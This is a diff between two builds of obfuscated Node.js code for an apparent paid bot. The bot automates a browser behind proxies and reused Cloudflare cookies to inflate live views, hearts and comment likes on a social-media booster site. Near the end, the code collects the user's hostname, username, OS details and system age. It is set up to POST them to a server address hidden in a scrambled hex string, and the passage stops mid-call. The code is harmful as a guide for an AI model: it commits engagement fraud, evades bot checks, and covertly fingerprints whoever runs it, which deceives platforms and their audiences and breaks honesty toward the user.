-    if (!v95 && v576.WEQbA(v74, Math.sqrt(Infinity))) {
-      const v601 = v576.PObwK.split("|");
-      let v602 = 0;
+    if (!v95 && v593.KUkjQ(v72, Math.sqrt(Infinity))) {
+      const v617 = v593.VYaIH.split("|");
+      let v618 = 0;
       while (true) {
-        switch (v601[v602++]) {
+        switch (v617[v618++]) {
           case "0":
-            v576.ogwod(clearInterval, v71);
+            v593.tcUcl(clearInterval, v69);
             continue;
           case "1":
-            await v576.TBbHA(f36);
+            v593.MWPgt(clearInterval, v70);
             continue;
           case "2":
-            v576.bkgZj(setTimeout, async () => {
-              console.info("\n\n", vV584.zuPCl, vV584.vVDrf, vV584.zstNG, vV584.aMiZZ, v65 + " Buy license in[35m " + v53 + "[0m\n");
-            }, 100);
+            v593.NAgZY(clearInterval, v68);
             continue;
           case "3":
-            v576.pikDK(clearInterval, v70);
+            v593.WIGpk(setTimeout, async () => {
+              console.info("\n\n", v593.bMzgd, v593.OhdKq, v593.nfznn, v593.zEKjG, v63 + " Buy license in[35m " + v51 + "[0m\n");
+            }, 100);
             continue;
           case "4":
-            vV552 = v56;
+            vV532 = v54;
             continue;
           case "5":
-            v576.ainMc(clearInterval, v72);
+            await v593.DYtKw(f37);
             continue;
         }
         break;
       }
     }
-    if (vA0zS.limit && v576.MJHYp(vA0zS.limit, 0) && v576.fCdkx(v74, vA0zS.limit)) {
-      v576.PzfdY(f53, "[" + p1731 + "] " + v577 + " (+" + v74 + ") [" + p1732 + "] Accumulation limit reached! (in " + v576.TBbHA(f54) + " mins)");
-      if (!v26) {
+    if (vA0iw.limit && v593.eXFzk(vA0iw.limit, 0) && v593.KUkjQ(v72, vA0iw.limit)) {
+      v593.YWWBU(f54, "[" + p1806 + "] " + v594 + " (+" + v72 + ") [" + p1807 + "] Accumulation limit reached! (in " + v593.kJZCG(f55) + " mins)");
+      if (!v28) {
         process.stdout.clearLine(0);
         process.stdout.cursorTo(0);
-        process.stdout.write(v58 + " Accumulation limit reached!");
+        process.stdout.write(v56 + " Accumulation limit reached!");
       }
       process.exit(0);
     }
-    if (vA0zS[v576.XRCfy] && v576.fCdkx(vA0zS[v576.XRCfy], 0) && v576.nmgYC(v74, vA0zS[v576.XRCfy]) && v576.HbKtw(v576.QFzjJ(f54), 60)) {
-      v576.rcTni(f53, "[" + p1731 + "] " + v577 + " (+" + v74 + ") [" + p1732 + "] Stopped for not accumulating the defined minimum! (in " + v576.ReKMo(f54) + " mins)");
-      if (!v26) {
+    if (vA0iw[v593.YpsIf] && v593.fUvdf(vA0iw[v593.YpsIf], 0) && v593.oFLFc(v72, vA0iw[v593.YpsIf]) && v593.VFhfY(v593.DYtKw(f55), 60)) {
+      v593.OxdUy(f54, "[" + p1806 + "] " + v594 + " (+" + v72 + ") [" + p1807 + "] Stopped for not accumulating the defined minimum! (in " + v593.UJrgU(f55) + " mins)");
+      if (!v28) {
         process.stdout.clearLine(0);
         process.stdout.cursorTo(0);
-        process.stdout.write(v58 + " Stopped for not accumulating the defined minimum!");
+        process.stdout.write(v56 + " Stopped for not accumulating the defined minimum!");
       }
       process.exit(0);
     }
-    if (vA0zS[v576.KLUbq] && v576.WEQbA(vA0zS[v576.KLUbq], 0) && v576.fCdkx(v576.ReKMo(f54), v576.MjxoS(vA0zS[v576.KLUbq], 60))) {
-      v576.dSKdB(f53, "[" + p1731 + "] " + v577 + " (+" + v74 + ") [" + p1732 + "] Stopped for reaching the maximum time limit! (in " + v576.wDUTM(f54) + " mins)");
-      if (!v26) {
+    if (vA0iw[v593.DwmUs] && v593.UVMfb(vA0iw[v593.DwmUs], 0) && v593.KUkjQ(v593.WaZDk(f55), v593.ebJPO(vA0iw[v593.DwmUs], 60))) {
+      v593.ubJwA(f54, "[" + p1806 + "] " + v594 + " (+" + v72 + ") [" + p1807 + "] Stopped for reaching the maximum time limit! (in " + v593.cbWBf(f55) + " mins)");
+      if (!v28) {
         process.stdout.clearLine(0);
         process.stdout.cursorTo(0);
-        process.stdout.write(v58 + " Stopped for reaching the maximum time limit!");
+        process.stdout.write(v56 + " Stopped for reaching the maximum time limit!");
       }
       process.exit(0);
     }
-    v580 = !v580;
+    v597 = !v597;
   }, 1000);
 }
-async function f73(p1830, p1831, p1832, p1833, p1834 = null) {
-  const v603 = {
-    BwgzW: function (p1835, p1836) {
-      return p1835(p1836);
+async function f74(p1919, p1920, p1921, p1922, p1923 = null) {
+  const v619 = {
+    GgEvW: function (p1924, p1925) {
+      return p1924(p1925);
     },
-    QakeV: function (p1837, p1838) {
-      return p1837 && p1838;
+    zTnwG: function (p1926, p1927) {
+      return p1926(p1927);
     },
-    FxUDv: function (p1839, p1840) {
-      return p1839 !== p1840;
+    YleTz: function (p1928, p1929) {
+      return p1928 && p1929;
     },
-    Erszc: function (p1841, p1842) {
-      return p1841(p1842);
+    mvUJy: function (p1930, p1931) {
+      return p1930 !== p1931;
     },
-    oxfYc: function (p1843, p1844) {
-      return p1843(p1844);
+    Gfiym: function (p1932, p1933) {
+      return p1932(p1933);
     },
-    RzMAN: function (p1845, p1846) {
-      return p1845 == p1846;
+    klhjy: function (p1934, p1935) {
+      return p1934 == p1935;
     },
-    eVCgL: "input.form-control.form-control-lg",
-    CvKCK: function (p1847, p1848) {
-      return p1847 === p1848;
+    iTGuY: function (p1936, p1937) {
+      return p1936(p1937);
     },
-    jZFVh: "Up Live Views",
-    NWzRZ: function (p1849, p1850) {
-      return p1849(p1850);
+    fvkLe: "input.form-control.form-control-lg",
+    fkXys: function (p1938, p1939) {
+      return p1938 === p1939;
     },
-    zuWQO: function (p1851, p1852, p1853) {
-      return p1851(p1852, p1853);
+    QOcOe: "Up Live Views",
+    rZywM: function (p1940, p1941) {
+      return p1940(p1941);
+    },
+    XImzi: function (p1942, p1943, p1944) {
+      return p1942(p1943, p1944);
     }
   };
-  return v603.zuWQO(setInterval, async () => {
+  return v619.XImzi(setInterval, async () => {
     try {
-      let v604 = await p1830.evaluate("(() => {\n          var div = document.querySelector('.fa.fa-heart.fa-2x');\n          if (div) {\n            return true;\n          }\n          return false;\n        })();");
-      if (v603.QakeV(v604, !v87)) {
-        const v605 = await p1830.evaluate("(() => {\n            const commentNodes = document.querySelectorAll('.input-group.mb-1');\n            const commentsArray = [];\n            const maxTotalLength = 58;\n            commentNodes.forEach(node => {\n              const author = node.querySelector('strong').innerText;\n              const text = node.querySelector('small').innerText;\n              const hearts = parseInt(node.querySelector('.btn-info.btn-sm small').innerText.replace(/,/g, ''));\n              const authorPart = author;\n              const heartsPart = '(' + hearts + ')';\n              const availableLengthForText = maxTotalLength - (authorPart.length + heartsPart.length + 6);            \n              let textPart = text;\n              const textLength = Array.from(text).length;\n              if (textLength > availableLengthForText) {\n                textPart = text.substring(0, availableLengthForText - 4) + '...\"';\n              } else {\n                textPart = (text + '\"').padEnd(availableLengthForText);\n              }\n              const finalConcat = authorPart + ' \"' + textPart + ' '  + heartsPart;\n              commentsArray.push({\n                username: author,\n                comment: text,\n                timestamp: 0,\n                likes: hearts,\n                concat: finalConcat\n              });\n            });\n            return commentsArray;\n          })();");
-        v86 = [...new Set([...v86, ...v605].map(JSON.stringify))].map(JSON.parse);
-        await v603.BwgzW(f52, 300);
-        await p1830.evaluate("(() => {\n            var nextBtn = document.querySelector('li[title=\"next\"] > button');\n            if (nextBtn) {\n              nextBtn.click();\n            }\n          })();");
+      let v620 = await p1919.evaluate("(() => {\n          var div = document.querySelector('.fa.fa-heart.fa-2x');\n          if (div) {\n            return true;\n          }\n          return false;\n        })();");
+      if (v619.YleTz(v620, !v85)) {
+        const v621 = await p1919.evaluate("(() => {\n            const commentNodes = document.querySelectorAll('.input-group.mb-1');\n            const commentsArray = [];\n            const maxTotalLength = 58;\n            commentNodes.forEach(node => {\n              const author = node.querySelector('strong').innerText;\n              const text = node.querySelector('small').innerText;\n              const hearts = parseInt(node.querySelector('.btn-info.btn-sm small').innerText.replace(/,/g, ''));\n              const authorPart = author;\n              const heartsPart = '(' + hearts + ')';\n              const availableLengthForText = maxTotalLength - (authorPart.length + heartsPart.length + 6);            \n              let textPart = text;\n              const textLength = Array.from(text).length;\n              if (textLength > availableLengthForText) {\n                textPart = text.substring(0, availableLengthForText - 4) + '...\"';\n              } else {\n                textPart = (text + '\"').padEnd(availableLengthForText);\n              }\n              const finalConcat = authorPart + ' \"' + textPart + ' '  + heartsPart;\n              commentsArray.push({\n                username: author,\n                comment: text,\n                timestamp: 0,\n                likes: hearts,\n                concat: finalConcat\n              });\n            });\n            return commentsArray;\n          })();");
+        v84 = [...new Set([...v84, ...v621].map(JSON.stringify))].map(JSON.parse);
+        await v619.GgEvW(f53, 1000);
+        await p1919.evaluate("(() => {\n            var nextBtn = document.querySelector('li[title=\"next\"] > button');\n            if (nextBtn) {\n              nextBtn.click();\n            }\n          })();");
       }
-      if (!v604) {
-        await p1830.evaluate("(() => {\n            var modalElement = document.querySelector('.modal.show button.close')\n            if (modalElement) {\n              modalElement.click();\n            }\n          })();");
-        await p1830.evaluate("(() => {\n            var modeBtn = document.querySelector('" + p1831 + "');\n            if (modeBtn) {\n              modeBtn.click();\n            }\n          })();");
-        await p1830.evaluate("(() => {\n            var modeBtn = document.querySelector('.modal.show button.btn.btn-lg.btn-secondary[data-dismiss=modal]');\n            if (modeBtn) {\n              modeBtn.click();\n            }\n          })();");
+      if (!v620) {
+        await p1919.evaluate("(() => {\n            var modalElement = document.querySelector('.modal.show button.close')\n            if (modalElement) {\n              modalElement.click();\n            }\n          })();");
+        await p1919.evaluate("(() => {\n            var modeBtn = document.querySelector('" + p1920 + "');\n            if (modeBtn) {\n              modeBtn.click();\n            }\n          })();");
+        await p1919.evaluate("(() => {\n            var modeBtn = document.querySelector('.modal.show button.btn.btn-lg.btn-secondary[data-dismiss=modal]');\n            if (modeBtn) {\n              modeBtn.click();\n            }\n          })();");
       }
-      const v606 = await p1830.evaluate("(() => {\n          let divs = Array.from(document.querySelectorAll('div.col-12.text-left.p-0'));\n          for (let div of divs) {\n            if (div.textContent.trim() === 'No an comment found.') {\n              const refreshBtn = document.querySelector('button[title=\"refresh\"]');\n              if (refreshBtn) {\n                refreshBtn.click();\n              }\n              return true;\n            }\n          }\n          return false;\n        })();");
-      if (v606) {
-        v87 = true;
+      const v622 = await p1919.evaluate("(() => {\n          let divs = Array.from(document.querySelectorAll('div.col-12.text-left.p-0'));\n          for (let div of divs) {\n            if (div.textContent.trim() === 'No an comment found.') {\n              const refreshBtn = document.querySelector('button[title=\"refresh\"]');\n              if (refreshBtn) {\n                refreshBtn.click();\n              }\n              return true;\n            }\n          }\n          return false;\n        })();");
+      if (v622) {
+        v85 = true;
       }
-      const v607 = await p1830.evaluate("(() => {\n          let lis = Array.from(document.querySelectorAll('li.page-item.disabled'));\n          for (let li of lis) {\n            if (li.getAttribute('title') === 'next') {\n              const refreshBtn = document.querySelector('button[title=\"refresh\"]');\n              if (refreshBtn) {\n                refreshBtn.click();\n              }\n              return true;\n            }\n          }\n          return false;\n        })();");
-      if (v607) {
-        v87 = true;
+      const v623 = await p1919.evaluate("(() => {\n          let lis = Array.from(document.querySelectorAll('li.page-item.disabled'));\n          for (let li of lis) {\n            if (li.getAttribute('title') === 'next') {\n              const refreshBtn = document.querySelector('button[title=\"refresh\"]');\n              if (refreshBtn) {\n                refreshBtn.click();\n              }\n              return true;\n            }\n          }\n          return false;\n        })();");
+      if (v623) {
+        v85 = true;
       }
-      if (v604 && v603.FxUDv(p1834, null) && v88 && v87) {
-        function f74(p1854) {
-          return v603.BwgzW(btoa, v603.BwgzW(unescape, v603.BwgzW(encodeURIComponent, p1854)));
+      if (v620 && v619.mvUJy(p1923, null) && v86 && v85) {
+        function f75(p1945) {
+          return v619.GgEvW(btoa, v619.GgEvW(unescape, v619.zTnwG(encodeURIComponent, p1945)));
         }
-        const v608 = await p1830.evaluate("(() => {\n            function base64Encode(str) {\n              return btoa(unescape(encodeURIComponent(str)));\n            }\n            const comments = document.querySelectorAll('#msg div.input-group.mb-1');\n            for (let i = 0; i < comments.length; i++) {\n              const comment = comments[i];\n              const username = base64Encode(comment.querySelector('div.col-10 > p > strong').innerText.trim());\n              const text = base64Encode(comment.querySelector('div.col-10 > p > small').innerText.trim());\n        \n              if (username === '" + v603.Erszc(f74, v88.username.trim()) + "' && text === '" + v603.Erszc(f74, v88.comment.trim()) + "') {\n                return i;\n              }\n            }\n            return null;\n          })();");
-        await v603.oxfYc(f52, 500);
-        if (v608) {
-          const v609 = await p1830.evaluate("(() => {\n              var likeBtn = document.querySelectorAll('#msg button.btn.btn-info.btn-sm')[" + v608 + "];\n              if (likeBtn) {\n                const hearts = parseInt(likeBtn.querySelector('small').innerText.replace(/,/g, ''));\n                return hearts;\n              }\n              return null;\n            })();");
-          if (v609) {
-            v88.likes = v609;
-            await v603.Erszc(f52, 500);
-            await p1830.evaluate("(() => {\n                var likeBtn = document.querySelectorAll('#msg button.btn.btn-info.btn-sm')[" + v608 + "];\n                if (likeBtn) {\n                  likeBtn.click();\n                }\n              })();");
+        const v624 = await p1919.evaluate("(() => {\n            function base64Encode(str) {\n              return btoa(unescape(encodeURIComponent(str)));\n            }\n            const comments = document.querySelectorAll('#msg div.input-group.mb-1');\n            for (let i = 0; i < comments.length; i++) {\n              const comment = comments[i];\n              const username = base64Encode(comment.querySelector('div.col > p > strong').innerText.trim());\n              const text = base64Encode(comment.querySelector('div.col > p > small').innerText.trim());\n        \n              if (username === '" + v619.GgEvW(f75, v86.username.trim()) + "' && text === '" + v619.zTnwG(f75, v86.comment.trim()) + "') {\n                return i;\n              }\n            }\n            return null;\n          })();");
+        await v619.Gfiym(f53, 500);
+        if (v624) {
+          const v625 = await p1919.evaluate("(() => {\n              var likeBtn = document.querySelectorAll('#msg button.btn.btn-info.btn-sm')[" + v624 + "];\n              if (likeBtn) {\n                const hearts = parseInt(likeBtn.querySelector('small').innerText.replace(/,/g, ''));\n                return hearts;\n              }\n              return null;\n            })();");
+          if (v625) {
+            v86.likes = v625;
+            await v619.GgEvW(f53, 500);
+            await p1919.evaluate("(() => {\n                var likeBtn = document.querySelectorAll('#msg button.btn.btn-info.btn-sm')[" + v624 + "];\n                if (likeBtn) {\n                  likeBtn.click();\n                }\n              })();");
           }
         } else {
-          await p1830.evaluate("(() => {\n              const nextBtn = document.querySelector('li[title=\"next\"] > button');\n              if (nextBtn) {\n                nextBtn.click();\n              }\n            })();");
+          await p1919.evaluate("(() => {\n              const nextBtn = document.querySelector('li[title=\"next\"] > button');\n              if (nextBtn) {\n                nextBtn.click();\n              }\n            })();");
         }
       }
-      let v610 = await p1830.evaluate("(() => {\n          var minElement = document.getElementById('min');\n          var secElement = document.getElementById('sec');\n          if (minElement && secElement) {\n            var minutes = minElement.textContent;\n            var seconds = secElement.textContent;\n            return minutes + \":\" + seconds;\n          }\n          return \"\";\n        })();");
-      if (v603.RzMAN(v610, "") && !v604) {
-        await p1830.evaluate("(() => {\n            var modeBtn = document.querySelector(\"button.btn.btn-primary\");\n            if (modeBtn) {\n              modeBtn.click();\n            }\n          })();");
-        await v603.Erszc(f52, 300);
-        let v611 = await p1830.evaluate("(() => {\n            return document.querySelector('input.form-control.form-control-lg');\n          })();");
-        if (v611) {
-          await p1830.$eval(v603.eVCgL, (p1855, p1856) => p1855.value = p1856, p1833);
-          await p1830.evaluate("(() => {\n              var modeBtn = document.querySelector(\"button.btn.btn-outline-secondary\");\n              if (modeBtn) {\n                modeBtn.click();\n              }\n            })();");
+      let v626 = await p1919.evaluate("(() => {\n          var minElement = document.getElementById('min');\n          var secElement = document.getElementById('sec');\n          if (minElement && secElement) {\n            var minutes = minElement.textContent;\n            var seconds = secElement.textContent;\n            return minutes + \":\" + seconds;\n          }\n          return \"\";\n        })();");
+      if (v619.klhjy(v626, "") && !v620) {
+        await p1919.evaluate("(() => {\n            var modeBtn = document.querySelector(\"button.btn.btn-primary\");\n            if (modeBtn) {\n              modeBtn.click();\n            }\n          })();");
+        await v619.iTGuY(f53, 1000);
+        let v627 = await p1919.evaluate("(() => {\n            return document.querySelector('input.form-control.form-control-lg');\n          })();");
+        if (v627) {
+          await p1919.$eval(v619.fvkLe, (p1946, p1947) => p1946.value = p1947, p1922);
+          await p1919.evaluate("(() => {\n              var modeBtn = document.querySelector(\"button.btn.btn-outline-secondary\");\n              if (modeBtn) {\n                modeBtn.click();\n              }\n            })();");
         }
       }
-      if (v603.CvKCK(p1832, v603.jZFVh)) {
-        v83 = v603.Erszc(f56, p1833) || v83;
+      if (v619.fkXys(p1921, v619.QOcOe)) {
+        v81 = v619.rZywM(f57, p1922) || v81;
       }
-    } catch (A) {
-      v603.NWzRZ(f53, A);
+    } catch (q) {
+      v619.Gfiym(f54, q);
     }
   }, 5000);
 }
-async function f75() {
-  const v612 = {
-    CNFKS: function (p1857) {
-      return p1857();
+async function f76() {
+  const v628 = {
+    VSULL: function (p1948) {
+      return p1948();
     },
-    dKOyP: function (p1858, p1859) {
-      return p1858(p1859);
+    YCser: function (p1949, p1950) {
+      return p1949(p1950);
     }
   };
-  let v613 = await v612.CNFKS(f64);
-  return await v612.dKOyP(f76, v613);
+  let v629 = await v628.VSULL(f65);
+  return await v628.YCser(f77, v629);
 }
-async function f76(p1860) {
-  const v614 = {
-    qqHGw: function (p1861, p1862) {
-      return p1861 === p1862;
+async function f77(p1951) {
+  const v630 = {
+    womvD: function (p1952, p1953) {
+      return p1952 === p1953;
     },
-    OZYmw: "Up "
+    zbKNU: "Up "
   };
-  const vV614 = v614;
-  let v615 = await p1860.evaluate("(() => {\n      let choices = Array.from(document.querySelectorAll(\".card-body.p-1 > small\"));\n      choices = choices.map((c) => {\n        const parts = c.innerText.replace(" + /(\r\n|\n|\r|:)/gm + ", \" \").split(\"  \");\n        return {\n          name: 'Up ' + parts[0].replace(\"views\", \"Views\").replace(\"hearts\", \"Hearts\").replace(\"Comment\", \"Comments\"),\n          disabled:" + /soon/ + ".test(parts[1]) ? true : false,\n        };\n      });\n      return choices.filter((c) => !c.disabled);\n    })();");
-  if (!v615.length || vV614.qqHGw(v615[0].name, vV614.OZYmw)) {
+  const vV630 = v630;
+  let v631 = await p1951.evaluate("(() => {\n      let choices = Array.from(document.querySelectorAll(\".card-body.p-1 > small\"));\n      choices = choices.map((c) => {\n        const parts = c.innerText.replace(" + /(\r\n|\n|\r|:)/gm + ", \" \").split(\"  \");\n        return {\n          name: 'Up ' + parts[0].replace(\"views\", \"Views\").replace(\"hearts\", \"Hearts\").replace(\"Comment\", \"Comments\"),\n          disabled:" + /soon/ + ".test(parts[1]) ? true : false,\n        };\n      });\n      return choices.filter((c) => !c.disabled);\n    })();");
+  if (!v631.length || vV630.womvD(v631[0].name, vV630.zbKNU)) {
     return false;
   }
-  const v616 = v615.map(p1863 => p1863.name);
-  return v616;
+  const v632 = v631.map(p1954 => p1954.name);
+  return v632;
 }
-async function f77(p1864 = true) {
-  const v617 = {
-    qpbbA: function (p1865) {
-      return p1865();
+async function f78(p1955 = true) {
+  const v633 = {
+    jqtKF: function (p1956) {
+      return p1956();
     },
-    DHxCo: function (p1866, p1867) {
-      return p1866(p1867);
+    VHOLL: function (p1957, p1958) {
+      return p1957(p1958);
     },
-    hjPLY: "--no-sandbox",
-    glNoA: "--window-size=900,900",
-    HRjcu: "--window-position=200,0",
-    HYwZD: function (p1868, p1869) {
-      return p1868 + p1869;
+    NgEEo: "--no-sandbox",
+    MsmRA: "--window-size=900,900",
+    tfNsH: "--window-position=200,0",
+    nlrDR: function (p1959, p1960) {
+      return p1959 + p1960;
     },
-    PbMCJ: "--user-agent=",
-    mEhvY: function (p1870, p1871) {
-      return p1870 + p1871;
+    WEDJQ: "--user-agent=",
+    iPKYL: "--proxy-server=",
+    UrMHo: "--disable-gpu",
+    kLNJu: "--disable-gpu-compositing",
+    dWqOT: "browser-user",
+    XJIha: function (p1961) {
+      return p1961();
     },
-    JqLnr: "--proxy-server=",
-    npTRv: "--disable-gpu",
-    MqXfj: "--disable-gpu-compositing",
-    QWmFp: "browser-user",
-    mYWjK: function (p1872) {
-      return p1872();
+    oUZhZ: function (p1962, p1963) {
+      return p1962(p1963);
     },
-    WPaAy: function (p1873, p1874) {
-      return p1873(p1874);
+    gVhZp: function (p1964, p1965) {
+      return p1964(p1965);
     }
   };
-  if (a0zd.existsSync(v93)) {
-    const v618 = await v617.qpbbA(f31);
-    const v619 = v618.find(p1875 => p1875.name === "user_agent");
-    v77 = v617.DHxCo(decodeURIComponent, v619.value);
-    const v620 = v618.find(p1876 => p1876.name === "bt_proxy");
-    v82 = v620?.value || v82;
+  if (a0ic.existsSync(v93)) {
+    const v634 = await v633.jqtKF(f32);
+    const v635 = v634.find(p1966 => p1966.name === "user_agent");
+    v75 = v633.VHOLL(decodeURIComponent, v635.value);
+    const v636 = v634.find(p1967 => p1967.name === "bt_proxy");
+    v80 = v636?.value || v80;
   } else {
     console.log("Cloudflare Expired / Freer Expired");
     return false;
   }
-  let vV823 = v82;
-  let v621 = [v617.hjPLY, v617.glNoA, v617.HRjcu, v617.HYwZD(v617.PbMCJ, v77), v617.mEhvY(v617.JqLnr, vV823)];
-  if (v35) {
-    v621 = [...v621, v617.npTRv, v617.MqXfj];
+  let vV803 = v80;
+  let v637 = [v633.NgEEo, v633.MsmRA, v633.tfNsH, v633.nlrDR(v633.WEDJQ, v75), v633.nlrDR(v633.iPKYL, vV803)];
+  if (v33) {
+    v637 = [...v637, v633.UrMHo, v633.kLNJu];
   }
-  const v622 = {
-    headless: p1864,
-    args: v621,
-    executablePath: vA0zS.browser,
-    userDataDir: vA0zS[v617.QWmFp]
+  const v638 = {
+    headless: p1955,
+    args: v637,
+    executablePath: vA0iw.browser,
+    userDataDir: vA0iw[v633.dWqOT]
   };
-  const v623 = await a0zC.launch(v622);
+  const v639 = await a0iz.launch(v638);
   try {
-    const v624 = (await v623.pages())[0];
-    const v625 = await v617.mYWjK(f31);
-    await v617.DHxCo(f52, 300);
-    await v624.setCookie(...v625);
-    await v624.goto(v92, {
+    const v640 = (await v639.pages())[0];
+    const v641 = await v633.XJIha(f32);
+    await v633.oUZhZ(f53, 300);
+    await v640.setCookie(...v641);
+    await v640.goto(v92, {
       timeout: 0
     });
-    await v617.WPaAy(f52, 3000);
-    const v627 = await v624.content();
-    if (/homedecoratione/.test(v627)) {
-      if (/Security Check/.test(v627)) {
+    await v633.gVhZp(f53, 3000);
+    const v643 = await v640.content();
+    if (/homedecoratione/.test(v643)) {
+      if (/Security Check/.test(v643)) {
         console.log("Cloudflare Valid / Freer Expired");
       } else {
         console.log("Cloudflare Valid / Freer Valid");
@@ -8434,699 +8700,705 @@ async function f77(p1864 = true) {
     }
     console.log("Cloudflare Expired / Freer Expired");
     return false;
-  } catch (A) {
-    console.log(A);
+  } catch (q) {
+    console.log(q);
     return false;
   } finally {
-    await v623.close();
+    await v639.close();
   }
 }
-function f78(p1877) {
-  const v628 = {
-    Kadse: function (p1878, p1879) {
-      return p1878 < p1879;
+function f79(p1968) {
+  const v644 = {
+    upvXg: function (p1969, p1970) {
+      return p1969 < p1970;
     },
-    Dgtbz: function (p1880, p1881) {
-      return p1880 + p1881;
+    TYGNw: function (p1971, p1972) {
+      return p1971 + p1972;
     }
   };
-  const vV628 = v628;
-  let v629 = [];
-  for (let v630 = 0; vV628.Kadse(v630, p1877.length); v630 += 64) {
-    v629.push(p1877.slice(v630, vV628.Dgtbz(v630, 64)));
+  const vV644 = v644;
+  let v645 = [];
+  for (let v646 = 0; vV644.upvXg(v646, p1968.length); v646 += 64) {
+    v645.push(p1968.slice(v646, vV644.TYGNw(v646, 64)));
   }
-  return v629;
+  return v645;
 }
-function f79(p1882) {
-  const v631 = {
-    Sitse: function (p1883, p1884) {
-      return p1883 < p1884;
+function f80(p1973) {
+  const v647 = {
+    bycrq: function (p1974, p1975) {
+      return p1974 < p1975;
     },
-    VeAgE: function (p1885, p1886) {
-      return p1885(p1886);
+    ObIZT: function (p1976, p1977) {
+      return p1976(p1977);
     }
   };
-  let v632 = v631.VeAgE(f78, p1882);
-  return v632.map(p1887 => {
-    let v633 = "";
-    for (let v634 = 0; v631.Sitse(v634, p1887.length); v634 += 2) {
-      v633 += p1887[v634];
+  let v648 = v647.ObIZT(f79, p1973);
+  return v648.map(p1978 => {
+    let v649 = "";
+    for (let v650 = 0; v647.bycrq(v650, p1978.length); v650 += 2) {
+      v649 += p1978[v650];
     }
-    return v633.split("").reverse().join("");
+    return v649.split("").reverse().join("");
   });
 }
-async function f80() {
-  const v635 = {
-    GOFHN: function (p1888, p1889) {
-      return p1888(p1889);
+async function f81() {
+  const v651 = {
+    vkutf: function (p1979, p1980) {
+      return p1979(p1980);
     },
-    LNSdX: function (p1890) {
-      return p1890();
+    JeMvs: function (p1981) {
+      return p1981();
     },
-    XEegV: function (p1891, p1892) {
-      return p1891 === p1892;
+    HrDJx: function (p1982, p1983) {
+      return p1982 === p1983;
     },
-    QsvOD: function (p1893) {
-      return p1893();
+    EQJsS: function (p1984) {
+      return p1984();
     },
-    PnEjA: function (p1894, p1895) {
-      return p1894(p1895);
+    TzcXj: function (p1985, p1986) {
+      return p1985 / p1986;
     },
-    LsayT: function (p1896, p1897) {
-      return p1896 / p1897;
+    iQpTT: function (p1987, p1988) {
+      return p1987 - p1988;
     },
-    ySSQS: function (p1898, p1899) {
-      return p1898 / p1899;
+    Oghyb: function (p1989, p1990) {
+      return p1989 * p1990;
     },
-    jbaLu: function (p1900, p1901) {
-      return p1900 - p1901;
+    DbRAn: function (p1991, p1992) {
+      return p1991 / p1992;
     },
-    nVDTG: function (p1902, p1903) {
-      return p1902 * p1903;
+    zTLws: function (p1993, p1994) {
+      return p1993 - p1994;
     },
-    WbebT: function (p1904, p1905) {
-      return p1904 * p1905;
+    sfmxz: function (p1995) {
+      return p1995();
     },
-    DUwPc: function (p1906, p1907) {
-      return p1906 * p1907;
+    IKtYa: function (p1996, p1997, p1998) {
+      return p1996(p1997, p1998);
     },
-    bUuMT: function (p1908, p1909) {
-      return p1908 * p1909;
+    maqbj: function (p1999, p2000) {
+      return p1999(p2000);
     },
-    ZnIRh: function (p1910, p1911) {
-      return p1910 * p1911;
+    HEhsk: "67f283030333a3232323e2433313e28333e21353f2f2a307474786",
+    MdLpQ: "POST",
+    RxfWf: "text/plain",
+    UUFIo: function (p2001, p2002) {
+      return p2001(p2002);
     },
-    AIaJD: function (p1912, p1913, p1914) {
-      return p1912(p1913, p1914);
-    },
-    GIyOa: "67f283030333a3232323e2433313e28333e21353f2f2a307474786",
-    kshEZ: "POST",
-    lOtEH: "text/plain",
-    VnUrQ: function (p1915, p1916) {
-      return p1915(p1916);
-    },
-    GtXtJ: "6343636663562373734323036323635323036346635363136356230373036313739323036363636673232303739363667353732323036336639363336353635673336353",
-    HGGwc: function (p1917, p1918) {
-      return p1917(p1918);
-    },
-    QJVLl: function (p1919, p1920) {
-      return p1919 === p1920;
-    }
+    SoCOU: "6343636663562373734323036323635323036346635363136356230373036313739323036363636673232303739363667353732323036336639363336353635673336353"
   };
-  const v636 = v635.GOFHN(f79, v635.LNSdX(f90));
-  let v637 = await v635.LNSdX(f35);
-  const vV637 = v637;
-  if (v635.XEegV(v637.length, 38)) {
-    v637 = v637.slice(0, 32);
+  const v652 = v651.vkutf(f80, v651.JeMvs(f91));
+  let v653 = await v651.JeMvs(f36);
+  const vV653 = v653;
+  if (v651.HrDJx(v653.length, 38)) {
+    v653 = v653.slice(0, 32);
   }
-  const v638 = await v635.QsvOD(f50);
-  const v639 = await v635.PnEjA(f49, v638);
-  const v640 = {
-    ver: "v" + v17,
-    platform: a0zy.platform(),
-    architecture: a0zy.arch(),
-    cpus: a0zy.cpus().length,
-    osType: a0zy.type(),
-    osRelease: a0zy.release(),
-    hostname: a0zy.hostname(),
-    username: a0zy.userInfo().username,
-    uptime: v635.LsayT(a0zy.uptime(), 3600).toFixed(2) + "-hrs",
-    sysOld: Math.ceil(v635.ySSQS(Math.abs(v635.jbaLu(new Date(), a0zd.statSync(a0zy.homedir()).birthtime)), v635.nVDTG(v635.WbebT(v635.DUwPc(1000, 60), 60), 24))) + "-d",
-    btOld: Math.ceil(v635.ySSQS(Math.abs(v635.jbaLu(new Date(), a0zd.statSync(vDirname).birthtime)), v635.bUuMT(v635.ZnIRh(v635.ZnIRh(1000, 60), 60), 24))) + "-d"
+  const v654 = await v651.EQJsS(f51);
+  const v655 = await v651.vkutf(f50, v654);
+  const v656 = {
+    ver: "v" + v19,
+    platform: a0iP.platform(),
+    architecture: a0iP.arch(),
+    cpus: a0iP.cpus().length,
+    osType: a0iP.type(),
+    osRelease: a0iP.release(),
+    hostname: a0iP.hostname(),
+    username: a0iP.userInfo().username,
+    uptime: v651.TzcXj(a0iP.uptime(), 3600).toFixed(2) + "-hrs",
+    sysOld: Math.ceil(v651.TzcXj(Math.abs(v651.iQpTT(new Date(), a0ic.statSync(a0iP.homedir()).birthtime)), v651.Oghyb(v651.Oghyb(v651.Oghyb(1000, 60), 60), 24))) + "-d",
+    btOld: Math.ceil(v651.DbRAn(Math.abs(v651.zTLws(new Date(), a0ic.statSync(vDirname).birthtime)), v651.Oghyb(v651.Oghyb(v651.Oghyb(1000, 60), 60), 24))) + "-d"
   };
-  const v641 = {
-    u: v635.QsvOD(f82) + "-" + v638 + "-" + v639,
-    k: vV637,
-    s: Object.values(v640).join("|")
+  const v657 = {
+    u: v651.sfmxz(f83) + "-" + v654 + "-" + v655,
+    k: vV653,
+    s: Object.values(v656).join("|")
   };
   try {
-    const v642 = v635.AIaJD(a0zN, v635.PnEjA(f89, v635.GIyOa), {
-      method: v635.kshEZ,
+    const v658 = v651.IKtYa(a0ia, v651.maqbj(f90, v651.HEhsk), {
